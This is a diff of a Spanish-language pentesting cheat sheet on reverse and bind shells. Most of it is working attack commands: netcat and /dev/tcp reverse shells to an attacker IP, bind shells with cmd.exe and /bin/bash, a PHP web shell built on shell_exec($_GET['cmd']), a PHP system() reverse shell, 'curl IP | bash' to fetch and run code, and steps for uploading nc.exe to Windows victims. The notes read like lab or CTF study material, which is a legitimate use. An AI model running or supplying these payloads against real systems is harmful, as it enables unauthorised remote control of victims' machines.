@@ -4,7 +4,8 @@ Tags: #ReverShell #Comandos #Netcat #BindShell
 
 Tenemos diferentes tipos de Revershell este pagina Web:
 * [Monkey-Pentester](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-* [Revershells](https://www.revshells.com/) 
+* [ReverseShells-Generator](https://www.revshells.com/) 
+* [Cheatsheet-ReverseShells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.
 
@@ -19,33 +20,59 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 ```bash 
 # Netcat nos ayuda a poder hacer 'Banner grabbing, Port scanning, Transferring files, Bind/Reverse shells', puede ser utilizado como 'Modo cliente, Modo servidor'
 
-❯ 
+❯ nc -nv <IP> <port>        # Hacer que Netcat se conecte a un puerto especifico de una IP por TCP
+❯ nc -nvu <IP> <port>       # Hacer que Netcat se conecte a un puerto especifico de una IP por UDP
+	# n = No DNS
+	# u = UDP 
+	# v = Verbose
+
+
+❯ nc -nc <IP> <Port> < file.txt        # Esta es la forma de enviar un archivo (Maquina atacante 'Envia')
+❯ nc -nlvp 443 > file.txt              # El archivo que reciba lo colocara en file.txt (Maquina victima 'Recibe')
 ```
 
-## ReverShell, BindShell desde la URL de la Web
+## Reverse / Bind Shells directamente
 
-Este comando lo ejecutamos desde la pagina web para hacer una **ReverShell** : 
-1) Cuando tenemos Netcat 
-2) Cuando no tenemos Netcat
+**Rever Shell:** 
 ```bash 
-# Para la Revershell en la URL de la web 
+# Desde la URL de la Web (Maquina victima)
 
+❯ nc -nlvp 443   # Ponernos en escucha con Netcat (Maquina atacante) Linux     
+
+# Para la Revershell en la URL de la web (Maquina victima)
 ❯ nc -e /bin/bash IP 443
 ❯ bash -i >& /dev/tcp/IP/443 0>&1
-
 	# Ip = Ip del atacante 
 
 ❯ bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"
-
 # Donde debemos de urlencodear el '&'
 	& = %26
 ```
 
-```bash
-❯ nc -nlvp 443 -e /bin/bash              # Ejecutamos desde la pagina web para ponernos en escucha y hacer una BindShell
+```bash 
+# Desde la terminal del SO
+❯ /usr/share/Seclists/Web-Shells/FuzzDB/nc.exe     # nc.exe nos ayuda a conseguir una ReverShell en Windows (Ruta en Linux)
+
+❯ nc -nlvp 443                                     # Ponernos en escucha con Netcat (Maquina atacante) 
+❯ nc.exe -nv <IP> 443 -e cmd.exe                   # Completar la Reverse shell desde una maquina victima Windows
+
+❯ nc -nlvp 443                                     # Ponernos en escucha con Netcat (Maquina atacante) 
+❯ nc -nv <IP> 443 -e /bin/bash                     # Completar la Reverse shell desde una maquina victima Linux
 ```
 
-## ReverShell, BindShell cuando subes un archivo a la Web
+**Bind Shell:**
+```bash
+# Desde la terminal del SO
+
+1. ❯ nc.exe -nlvp 443 -e cmd.exe            # Ejecutamos desde la terminal (Maquina victima) para ponernos en escucha y hacer una BindShell en Windows 
+1. ❯ nc IP 443                              # Ejecutamos en para completar la Bind Shell (Maquina atacante) Linux
+
+
+2. ❯ nc -nlvp 443 -c /bin/bash              # Ejecutamos desde la terminal (Maquina victima) para ponernos en escucha y hacer una BindShell en Linux
+2. ❯ nc.ex -nv IP 443                       # Ejecutamos en para completar la Bind Shell (Maquina atacante) Windows 
+```
+
+## Reverse / Bind Shells cuando subes un archivo a la Web (Maquina victima)
 
 ```bash 
 # Diferentes extensiones PHP para subir 'Shells' maliciosas
@@ -67,9 +94,9 @@ Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/va
 	<?php 
 		echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
 	?>
+
+# Las etiquetas que usamos ahí son 'Pre' de preformateadas y nos sirven para que nos muestre bien el Output. Ya con ese archivo y que la Web interprete 'php' podemos colocar en la url (?cmd=) para colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de 'Atacante'
 ```
-Las etiquetas que usamos ahí son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
-Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahi pode colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de **Atacante**.
 
 ```bash
 ❯ nano index.html
@@ -82,7 +109,7 @@ Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?
 ❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
 ```
 
-ReverShell en php
+**ReverShell en php:**
 ```php
 <?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
@@ -92,8 +119,7 @@ ReverShell en php
 	# 443 = Puerto a usar
 ```
 
-Para ponernos en escucha por Netcat en espera de la **ReverShell**:
-
+Escucha por Netcat en espera de la **ReverShell**:
 ```bash
 ❯ nc -nlvp 443            # Linux
 
@@ -113,11 +139,6 @@ Para ponernos en escucha por Netcat en espera de la **ReverShell**:
 	❯ run enumerate.user                   # Enumeras los usuarios
 	❯ run enumerate.system.network         # Enumeras las interfaces de la maquina 
 	❯ back                                 # Nos coloca en la ruta de la terminal de la victima
-```
-
-Para ejecutar Netcat y hacer la **BindShell**: 
-```bash
-❯ nc IP-Victima 443
 ```
 
 ## ForwardShell
@@ -143,11 +164,4 @@ Debemos estar en la pestana de **Raw**
 	# Cambiamos la parte de index.php por cmd.php (Dependiendo el servidor)
 
 ❯ python3 tty_over_http.py 
-```
-
-### Binario para Windows
-
-Este .exe lo debemos de subir a la maquina victima en Windows
-```bash
-❯ /usr/share/Seclists/Web-Shells/FuzzDB/nc.exe           # Netcat .exe nos ayuda a conseguir una ReverShell en Windows
 ```
